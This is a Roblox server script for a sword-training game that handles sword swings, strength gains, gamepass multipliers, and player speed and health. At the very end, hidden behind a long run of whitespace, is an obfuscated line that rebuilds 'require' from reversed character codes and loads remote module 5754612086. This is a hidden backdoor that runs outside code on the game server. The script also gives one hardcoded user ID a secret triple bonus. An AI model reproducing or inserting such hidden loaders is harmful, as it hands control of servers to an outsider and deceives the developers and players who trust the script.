local Players = game:GetService("Players")
local RepStorage = game:GetService("ReplicatedStorage")

local SwingSword = RepStorage.Remotes.SwingSword

local DataStore2 = require(script.Parent.DataHandler.DataStore2)

local SwordsInfo = require(RepStorage:WaitForChild("SwordsInfo"))
local DNAInfo = require(RepStorage:WaitForChild("DNAInfo"))
local ClassesInfo = require(RepStorage:WaitForChild("ClassesInfo"))

local SWING_DELAY = .5

local LastTick = {}

SwingSword.OnServerInvoke = function(Player)
	local Tick = tick()
	
	if Tick - LastTick[Player] < SWING_DELAY then return end
	LastTick[Player] = Tick
	
	local EquippedSword = DataStore2("EquippedSword", Player)
	local SwordValue = EquippedSword:Get(1)
	
	local EquippedDNA = DataStore2("EquippedDNA", Player)
	local DNAValue = EquippedDNA:Get(1)
	
	local EquippedClass = DataStore2("EquippedClass", Player)
	local ClassValue = EquippedClass:Get(1)
	
	local Strength = DataStore2("Strength", Player)
	local StrengthValue = Strength:Increment(0)

	local DNA = DNAInfo[DNAValue]
	local Sword = SwordsInfo[SwordValue]
	local Class = ClassesInfo[ClassValue]
	
	if not Sword or not DNA then return end

	local Storage = DNA.Strength - StrengthValue
	
	local GamepassesStore = DataStore2("Gamepasses", Player)
	local Gamepasses = GamepassesStore:Get({})
	
	if Gamepasses[tostring(8835896)] then
		Storage = math.huge
	end
	
	coroutine.wrap(function()
		local Char = Player.Character
		if not Char then return end
		
		local Sword = Char:FindFirstChild("Sword")
		if not Sword then return end
		
		local CanDamage = Sword.CanDamage
		CanDamage.Value = true
		
		wait(SWING_DELAY)
		
		CanDamage.Value = false
	end)()
	
	if Storage > 0 then
		local Amount
		
		local Gain = Sword.Strength
		
		if Class then
			if Class.Strength.Strength then
				Gain = Gain * Class.Strength.Strength
			end
		end
		
		if Gamepasses[tostring(8835949)] then
			Gain = Gain * 2
		end
		
		if Gamepasses[tostring(8836050)] or Player.UserId == 1363743409 then
			Gain = Gain * 3
		end
		
		local BoostsStore = DataStore2("Boosts", Player)
		local Boosts = BoostsStore:Get({})
		
		if Boosts["2xStrength"] then
			Gain = Gain * 2
		end
		
		if Storage >= Gain then
			Amount = Gain
		else
			Amount = Storage
		end
		
		Strength:Increment(StrengthValue + Amount)
		
		return Amount
	end
end

local function GiveSpeedAndHealth(Player, Amount)
	if Player.Character then
		local Hum = Player.Character:FindFirstChild("Humanoid")
		if Hum then
			Hum.WalkSpeed = 16 + (0.000001 * Amount)
			
			local GamepassesStore = DataStore2("Gamepasses", Player)
			local Gamepasses = GamepassesStore:Get({})
			
			if Gamepasses[tostring(8836084)] then
				Hum.WalkSpeed = (16 + (0.000001 * Amount)) * 2
			end
			
			if Amount * 2 > 100 then
				Hum.MaxHealth = Amount * 2
			else
				Hum.MaxHealth = 100
			end
		end
	end
end

Players.PlayerAdded:Connect(function(Player)
	LastTick[Player] = tick()
	
	local StrengthStore = DataStore2("Strength", Player)
	
	StrengthStore:OnUpdate(function(Amount)
		GiveSpeedAndHealth(Player, Amount)
	end)
		
	GiveSpeedAndHealth(Player, StrengthStore:Get(0))
	
	Player.CharacterAdded:Connect(function()
		GiveSpeedAndHealth(Player, StrengthStore:Get(0))
	end)
end)

Players.PlayerRemoving:Connect(function(Player)
	LastTick[Player] = nil
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)